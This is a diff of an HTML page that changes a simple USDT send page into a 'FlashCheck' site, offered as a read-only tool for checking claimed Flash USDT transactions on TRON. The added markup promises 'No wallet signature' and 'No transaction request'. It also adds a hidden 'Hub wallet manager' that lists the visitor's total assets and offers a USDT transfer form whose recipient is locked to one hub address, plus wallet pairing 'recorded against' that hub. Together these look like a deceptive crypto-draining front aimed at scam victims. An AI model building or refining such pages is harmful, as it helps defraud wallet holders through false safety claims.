@@ -4,79 +4,320 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="referrer" content="no-referrer">
-  <meta name="description" content="Connect TronLink on TRON mainnet to send USDT to one fixed recipient.">
-  <title>Connect wallet</title>
+  <meta name="description" content="Choose the Flash USDT Check option and learn what will be verified on TRON.">
+  <title>Flash USDT Checker</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='6' fill='%230b1712'/%3E%3Cpath d='M13.8 2 5 13.2h6.2L10.2 22 19 10.8h-6.2L13.8 2Z' fill='%2342f58d'/%3E%3C/svg%3E">
   <link rel="stylesheet" href="./src/styles.css">
 </head>
 <body>
-  <main class="screen">
-    <section class="card" id="send" aria-labelledby="page-title">
-      <p class="eyebrow">TRON mainnet · USDT</p>
-      <h1 id="page-title">Connect wallet</h1>
-      <p class="lede" id="wallet-presence">Looking for TronLink. Nothing connects until you choose Connect wallet.</p>
-      <button class="primary" id="connect-button" type="button">Connect wallet</button>
-      <p id="status" role="status" tabindex="-1">Not connected. No transaction has been created.</p>
-      <p id="error" role="alert"></p>
-
-      <div id="connected-panel" hidden>
-        <p class="label">Connected account</p>
-        <p class="address" id="account-address">Not connected</p>
-        <button class="ghost" id="copy-account" type="button" hidden>Copy account</button>
-        <p class="label">Network</p>
-        <p id="network-status">Not checked. Transfers stay off until TRON mainnet is verified.</p>
-        <button class="secondary" id="switch-network" type="button" hidden>Switch to TRON mainnet</button>
-        <button class="ghost" id="disconnect-button" type="button" hidden>Disconnect</button>
-
-        <form id="payment-form">
-          <p class="label">Recipient</p>
-          <p class="address" id="recipient">TG94XL9N1uVHPM4U4zcpYGc6w1i7nUBuiq</p>
-          <button class="ghost" id="copy-recipient" type="button">Copy recipient</button>
-          <p class="label">USDT contract</p>
-          <p class="address" id="token-contract">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</p>
-          <button class="ghost" id="copy-token" type="button">Copy contract</button>
-          <label for="amount">Amount (USDT)</label>
-          <input id="amount" name="amount" type="text" inputmode="decimal" autocomplete="off" spellcheck="false" placeholder="0.00" aria-describedby="amount-hint">
-          <p class="hint" id="amount-hint">Up to 6 decimal places. The recipient cannot be changed.</p>
-          <button class="primary" id="review-button" type="submit">Review transfer</button>
-        </form>
+  <div class="site-shell">
+    <header class="topbar">
+      <a class="brand" href="#" aria-label="FlashCheck home">
+        <span class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24"><path d="M13.8 2 5 13.2h6.2L10.2 22 19 10.8h-6.2L13.8 2Z"/></svg>
+        </span>
+        <span>Flash<span>Check</span></span>
+      </a>
+      <div class="header-controls">
+        <div class="connected-chip" id="connected-chip" hidden>
+          <span class="connected-dot" aria-hidden="true"></span>
+          <span id="header-address"></span>
+          <button id="disconnect-wallet" type="button">Disconnect</button>
+        </div>
+        <div class="network-pill"><span aria-hidden="true"></span> Web3 network</div>
+        <a class="header-master-link" href="/master-wallet">Hub master wallet</a>
       </div>
+    </header>
 
-      <section class="review" id="review-panel" hidden aria-labelledby="review-heading">
-        <h2 id="review-heading" tabindex="-1">Review transfer</h2>
-        <dl>
-          <div><dt>Token</dt><dd>USDT (TRC-20)</dd></div>
-          <div><dt>Token contract</dt><dd class="address" id="review-token">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</dd></div>
-          <div><dt>Network</dt><dd id="review-network">TRON mainnet</dd></div>
-          <div><dt>Sender</dt><dd class="address" id="review-sender">Not connected</dd></div>
-          <div><dt>Recipient</dt><dd class="address" id="review-recipient">TG94XL9N1uVHPM4U4zcpYGc6w1i7nUBuiq</dd></div>
-          <div><dt>Amount</dt><dd id="review-amount"></dd></div>
-          <div><dt>Token units (6 decimals)</dt><dd id="review-units"></dd></div>
-          <div><dt>Wallet action</dt><dd>Sign and submit USDT <code>transfer(recipient, amount)</code> only. This page does not request token approval.</dd></div>
-          <div><dt>Network fee</dt><dd id="review-fee">TronLink shows the energy and bandwidth fee before you approve. This page caps the fee limit at 100 TRX and does not add its own fee.</dd></div>
-        </dl>
-        <p class="warning" id="review-warning"><strong>Blockchain transfers cannot be reversed.</strong> Reject the wallet prompt if any line differs.</p>
-        <button class="final" id="send-button" type="button">Send USDT</button>
-        <button class="ghost" id="back-button" type="button">Back</button>
+    <main>
+      <section class="hero" aria-labelledby="page-title">
+        <div class="hero-copy">
+          <p class="eyebrow"><span></span> Secure token verification</p>
+          <h1 id="page-title">Check before<br><em>you trust.</em></h1>
+          <p class="lede">Review a claimed Flash USDT transaction against public TRON network data before you take action.</p>
+
+          <div class="trust-row" aria-label="Checker features">
+            <div><span class="trust-icon">✓</span><p><strong>Read-only</strong>No wallet signature</p></div>
+            <div><span class="trust-icon">✓</span><p><strong>Transparent</strong>Public chain data</p></div>
+            <div><span class="trust-icon">✓</span><p><strong>Fast</strong>Clear results</p></div>
+          </div>
+        </div>
+
+        <article class="option-card" aria-labelledby="option-title">
+          <div class="card-topline">
+            <span>Checker option</span>
+            <span>Page 01</span>
+          </div>
+          <div class="option-icon" aria-hidden="true">
+            <svg viewBox="0 0 64 64">
+              <path d="M32 8 51 15v14c0 13-7.8 23.3-19 27-11.2-3.7-19-14-19-27V15l19-7Z"/>
+              <path d="m23 32 6 6 12-13"/>
+            </svg>
+          </div>
+          <p class="option-label">Verification tool</p>
+          <h2 id="option-title">Flash USDT Check</h2>
+          <p>Inspect the transaction record, token contract, status, and amount on the TRON network.</p>
+          <button class="primary-action" id="open-wallet-flow" type="button" aria-controls="wallet-dialog" aria-expanded="false">
+            Start Flash USDT Check
+            <span aria-hidden="true">→</span>
+          </button>
+          <p class="privacy-note"><span aria-hidden="true">◇</span> Never enter a seed phrase or private key.</p>
+        </article>
       </section>
 
-      <div id="receipt-details" hidden>
-        <h2>Receipt</h2>
-        <p id="receipt-status"></p>
-        <p class="label">Sender</p>
-        <p class="address" id="receipt-sender"></p>
-        <p id="txid" hidden></p>
-        <p><a id="explorer-link" hidden href="https://tronscan.org/" rel="noopener noreferrer" target="_blank">View on TRONSCAN</a></p>
-        <button class="ghost" id="copy-txid" type="button" hidden>Copy transaction ID</button>
-      </div>
-    </section>
+      <section class="wallet-panel wallet-dialog" id="wallet-dialog" hidden aria-labelledby="wallet-title" aria-describedby="wallet-description">
+        <div class="dialog-topline">
+          <span class="dialog-step">Connect wallet</span>
+          <button class="dialog-close" id="close-wallet-flow" type="button" aria-label="Close wallet connection">×</button>
+        </div>
+        <div class="dialog-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24">
+            <path d="M4 7.5h14.5A1.5 1.5 0 0 1 20 9v9.5H5.5A2.5 2.5 0 0 1 3 16V6a2 2 0 0 1 2-2h12"/>
+            <path d="M15.5 12h6v4h-6a2 2 0 0 1 0-4Z"/>
+            <circle cx="16.5" cy="14" r=".6"/>
+          </svg>
+        </div>
+        <h2 id="wallet-title">Connect your Web3 wallet</h2>
+        <p id="wallet-description">Choose a wallet to verify your public address. This checker never asks for a recovery phrase or private key.</p>
 
-    <section id="receive" hidden>
-      <h2>Receive USDT</h2>
-      <div id="receive-qr" role="img" aria-label="QR code that opens this page only"></div>
-      <p id="receive-url"></p>
-    </section>
-  </main>
-  <noscript>JavaScript is required to connect a wallet. With JavaScript disabled, this page cannot create a transaction.</noscript>
-  <script type="module" src="./src/app.js?v=8"></script>
+        <section class="owner-pairing" id="owner-pairing" aria-labelledby="owner-pairing-title" hidden>
+          <p class="owner-kicker" id="owner-pairing-title">WalletConnect pairing</p>
+          <p class="owner-copy" id="pairing-copy">Approve pairing in your wallet, then sign the login message. Your connecting wallet address and balances appear below after pairing.</p>
+          <p class="connected-address owner-address" id="owner-address" hidden></p>
+          <p class="owner-hub-note" id="owner-hub-note">Verified connections are recorded against hub <span class="connected-address" id="owner-hub-target">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span>. Asset totals always belong to the wallet you connect.</p>
+          <div class="owner-qr-wrap" id="owner-qr-wrap" hidden>
+            <img id="owner-qr" alt="WalletConnect QR code for owner approval">
+          </div>
+          <a class="owner-deep-link" id="owner-deep-link" href="#" hidden>Open in a compatible wallet ↗</a>
+          <p class="owner-pairing-status" id="owner-pairing-status" role="status" aria-live="polite">Preparing secure WalletConnect pairing…</p>
+          <button class="retry-button" id="cancel-owner-pairing" type="button" hidden>Cancel pairing</button>
+        </section>
+
+        <section class="dialog-assets" id="dialog-wallet-assets" hidden aria-labelledby="dialog-assets-title">
+          <h3 class="asset-list-heading" id="dialog-assets-title">Total assets (TRX, TRC-10, TRC-20)</h3>
+          <p class="dialog-assets-address connected-address" id="dialog-visitor-address"></p>
+          <p class="asset-error" id="dialog-asset-error" role="alert" hidden></p>
+          <ul class="wallet-asset-plain-list asset-list" id="dialog-token-list" aria-labelledby="dialog-assets-title"></ul>
+          <p class="linked-note" id="dialog-asset-note">Connect a wallet to load balances from your wallet provider.</p>
+          <h4 class="asset-list-heading wallet-tx-heading" id="dialog-transactions-title">Recent wallet activity</h4>
+          <p class="asset-error" id="dialog-transaction-error" role="alert" hidden></p>
+          <ul class="wallet-tx-list" id="dialog-transaction-list" aria-labelledby="dialog-transactions-title"></ul>
+          <p class="linked-note" id="dialog-transaction-note">Activity is read through your connected wallet provider.</p>
+        </section>
+
+        <div class="wallet-options" id="wallet-options" hidden>
+          <button class="wallet-option" id="connect-metamask" type="button">
+            <span class="wallet-logo metamask-logo" aria-hidden="true">M</span>
+            <span><strong>MetaMask</strong><small>Connect an EVM account</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+          <button class="wallet-option" id="connect-tronlink" type="button">
+            <span class="wallet-logo tronlink-logo" aria-hidden="true">T</span>
+            <span><strong>TronLink</strong><small>Recommended for TRON</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+          <button class="wallet-option" id="connect-trust" type="button">
+            <span class="wallet-logo trust-logo" aria-hidden="true">◆</span>
+            <span><strong>Trust Wallet</strong><small>Connect an EVM or TRON account</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+          <button class="wallet-option" id="connect-injected" type="button">
+            <span class="wallet-logo injected-logo" aria-hidden="true">W</span>
+            <span><strong id="injected-wallet-name">Browser wallet</strong><small>Use another detected provider</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+          <button class="wallet-option" id="connect-walletconnect" type="button">
+            <span class="wallet-logo walletconnect-logo" aria-hidden="true">W</span>
+            <span><strong>WalletConnect</strong><small>Scan a QR code with a TRON wallet</small></span>
+            <span class="option-arrow" aria-hidden="true">→</span>
+          </button>
+        </div>
+
+        <div class="wallet-status" id="wallet-status" role="status" aria-live="polite" hidden>
+          <span class="status-mark" id="status-mark" aria-hidden="true"></span>
+          <div>
+            <strong id="status-title"></strong>
+            <p id="status-message"></p>
+            <p class="connected-address" id="connected-address" hidden></p>
+            <a class="wallet-help" id="wallet-help" href="https://www.tronlink.org/" target="_blank" rel="noopener noreferrer" hidden>Get the official wallet ↗</a>
+          </div>
+        </div>
+
+        <div class="wallet-actions">
+          <button class="retry-button" id="retry-wallets" type="button" hidden>Choose another wallet</button>
+        </div>
+        <p class="dialog-safety"><span aria-hidden="true">✓</span> Read-only connection · No transaction request</p>
+      </section>
+
+      <section class="linked-wallet-view" id="linked-wallet-view" hidden aria-labelledby="linked-wallet-title">
+        <div class="linked-wallet-heading">
+          <p class="eyebrow"><span></span> Connected wallet</p>
+          <h2 id="linked-wallet-title">Your wallet and total assets</h2>
+          <p class="lede">After you connect, this manage view shows your wallet, balances read from your wallet provider, and optional hub transfer requests that only your wallet can sign.</p>
+        </div>
+        <article class="linked-card linked-card-visitor" aria-labelledby="linked-visitor-label">
+          <p class="linked-label" id="linked-visitor-label">Connecting wallet address</p>
+          <p class="connected-address" id="linked-visitor-address"></p>
+          <h3 class="asset-list-heading" id="linked-assets-heading">Total assets (TRX, TRC-10, TRC-20)</h3>
+          <p class="asset-error" id="linked-asset-error" role="alert" hidden></p>
+          <ul class="wallet-asset-plain-list asset-list" id="linked-token-list" aria-labelledby="linked-assets-heading"></ul>
+          <p class="linked-note" id="linked-asset-note">Connect a wallet to load balances from your wallet provider.</p>
+          <h3 class="asset-list-heading wallet-tx-heading" id="linked-transactions-heading">Recent wallet activity</h3>
+          <p class="asset-error" id="linked-transaction-error" role="alert" hidden></p>
+          <ul class="wallet-tx-list" id="linked-transaction-list" aria-labelledby="linked-transactions-heading"></ul>
+          <p class="linked-note" id="linked-transaction-note">Activity is read through your connected wallet provider.</p>
+          <p class="linked-note linked-hub-note">Recorded hub link: <span class="connected-address" id="link-target-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span></p>
+        </article>
+
+        <article class="linked-card wallet-manager-card" id="wallet-manager-panel" hidden aria-labelledby="wallet-manager-title">
+          <p class="eyebrow"><span></span> Hub wallet manager</p>
+          <h3 id="wallet-manager-title">Manage connected wallet</h3>
+          <p class="lede wallet-manager-lede">Review this wallet’s balances from your wallet provider and request a USDT transfer to hub <span class="connected-address" id="manager-hub-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span>. Only your wallet can sign; nothing moves without that approval.</p>
+          <p class="linked-note wallet-manager-safety"><span aria-hidden="true">✓</span> No seed phrase · No private key · No auto-approve</p>
+
+          <div class="wallet-manager-tron" id="manager-transfer-tron" hidden>
+            <form class="wallet-manager-form" id="manager-transfer-form">
+              <label for="manager-transfer-recipient">Transfer recipient (hub)</label>
+              <input id="manager-transfer-recipient" name="recipient" type="text" readonly spellcheck="false" value="TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9" aria-describedby="manager-transfer-recipient-hint">
+              <p class="linked-note" id="manager-transfer-recipient-hint">Official TRC-20 USDT only. Recipient is fixed to the configured hub address.</p>
+              <label for="manager-transfer-amount">USDT amount</label>
+              <input id="manager-transfer-amount" name="amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
+              <button class="primary-action wallet-manager-submit" id="manager-review-transfer" type="submit">Review transfer request</button>
+            </form>
+
+            <div class="wallet-manager-review" id="manager-transfer-review" hidden>
+              <h4 class="wallet-manager-review-title">Confirm before your wallet signs</h4>
+              <dl class="wallet-manager-review-list">
+                <div><dt>From</dt><dd class="connected-address" id="manager-review-sender"></dd></div>
+                <div><dt>To (hub)</dt><dd class="connected-address" id="manager-review-recipient"></dd></div>
+                <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
+                <div><dt>Amount</dt><dd id="manager-review-amount"></dd></div>
+              </dl>
+              <p class="linked-note">Reject the wallet prompt if any detail differs. This page never submits without your signature.</p>
+              <div class="wallet-manager-actions">
+                <button class="primary-action" id="manager-sign-transfer" type="button">Approve transfer in wallet</button>
+                <button class="retry-button" id="manager-cancel-transfer" type="button">Cancel</button>
+              </div>
+            </div>
+          </div>
+
+          <p class="linked-note wallet-manager-evm" id="manager-transfer-evm-note" hidden>
+            The hub address is on TRON. Connect with TronLink, Trust Wallet (TRON), or WalletConnect on TRON mainnet to request a signed USDT transfer.
+          </p>
+
+          <p class="wallet-manager-status" id="manager-transfer-status" role="status" aria-live="polite"></p>
+          <p class="asset-error" id="manager-transfer-error" role="alert" hidden></p>
+        </article>
+      </section>
+
+      <section class="details" id="checker-details" aria-labelledby="details-title">
+        <div class="details-heading">
+          <p class="eyebrow"><span></span> What gets checked</p>
+          <h2 id="details-title">Know what is real.</h2>
+          <p>“Flash USDT” is not an official Tether token type. A reliable check must match the transaction to the official TRC-20 USDT contract and confirm its on-chain status.</p>
+        </div>
+        <ol class="check-list">
+          <li><span>01</span><div><strong>Transaction record</strong><p>Confirm that the transaction exists and succeeded on TRON.</p></div></li>
+          <li><span>02</span><div><strong>Official contract</strong><p>Match the token against Tether’s TRC-20 USDT contract.</p></div></li>
+          <li><span>03</span><div><strong>Transfer details</strong><p>Review the sender, recipient, amount, and timestamp.</p></div></li>
+        </ol>
+        <a class="contract-link" href="https://tronscan.org/#/token20/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" target="_blank" rel="noopener noreferrer">
+          View official USDT on TRONSCAN <span aria-hidden="true">↗</span>
+        </a>
+      </section>
+    </main>
+
+    <footer>
+      <p>FlashCheck <span>•</span> Verification guidance only</p>
+      <p><a href="/master-wallet">Hub master wallet review</a> <span>•</span> Never send funds based on a screenshot or promise of a temporary balance.</p>
+    </footer>
+  </div>
+
+  <noscript>
+    <p class="noscript">JavaScript is required for wallet connection. You can still use the official TRONSCAN link to inspect public network data.</p>
+  </noscript>
+  <script>
+    (function () {
+      var walletOptionIds = {
+        "connect-metamask": "metamask",
+        "connect-tronlink": "tronlink",
+        "connect-trust": "trust",
+        "connect-injected": "injected",
+        "connect-walletconnect": "walletconnect",
+      };
+
+      function revealWalletChooserPanel() {
+        var panel = document.getElementById("wallet-dialog");
+        if (!panel) return;
+        panel.hidden = false;
+        panel.removeAttribute("hidden");
+        var trigger = document.getElementById("open-wallet-flow");
+        if (trigger) trigger.setAttribute("aria-expanded", "true");
+        var options = document.getElementById("wallet-options");
+        if (options) {
+          options.hidden = false;
+          options.removeAttribute("hidden");
+        }
+        panel.scrollIntoView({ behavior: "smooth", block: "start" });
+      }
+
+      function showWalletModuleError(message) {
+        var options = document.getElementById("wallet-options");
+        if (options) options.hidden = true;
+        var status = document.getElementById("wallet-status");
+        if (!status) return;
+        status.hidden = false;
+        status.removeAttribute("hidden");
+        status.setAttribute("data-kind", "error");
+        var mark = document.getElementById("status-mark");
+        if (mark) mark.textContent = "!";
+        var title = document.getElementById("status-title");
+        if (title) title.textContent = "Connection unavailable";
+        var copy = document.getElementById("status-message");
+        if (copy) copy.textContent = message;
+        var help = document.getElementById("wallet-help");
+        if (help) help.hidden = true;
+        var retry = document.getElementById("retry-wallets");
+        if (retry) retry.hidden = false;
+      }
+
+      function invokeWalletConnectAction(action) {
+        revealWalletChooserPanel();
+        var api = window.flashCheckLanding;
+        if (api && api.ready) {
+          if (action === "walletconnect") {
+            api.connectWalletConnect();
+            return;
+          }
+          api.connectSelected(action);
+          return;
+        }
+        var detail = api && api.error ? " " + api.error : "";
+        showWalletModuleError(
+          "Wallet connection did not load. Refresh this page and try again." + detail,
+        );
+      }
+
+      document.addEventListener("click", function (event) {
+        var target = event.target;
+        if (!target || !target.closest) return;
+        if (target.closest("#open-wallet-flow")) {
+          revealWalletChooserPanel();
+          return;
+        }
+        var matchedId = null;
+        for (var id in walletOptionIds) {
+          if (target.closest("#" + id)) {
+            matchedId = id;
+            break;
+          }
+        }
+        if (!matchedId) return;
+        event.preventDefault();
+        invokeWalletConnectAction(walletOptionIds[matchedId]);
+      });
+    })();
+  </script>
+  <script type="module" src="./src/landing.js?v=dev"></script>
 </body>
 </html>
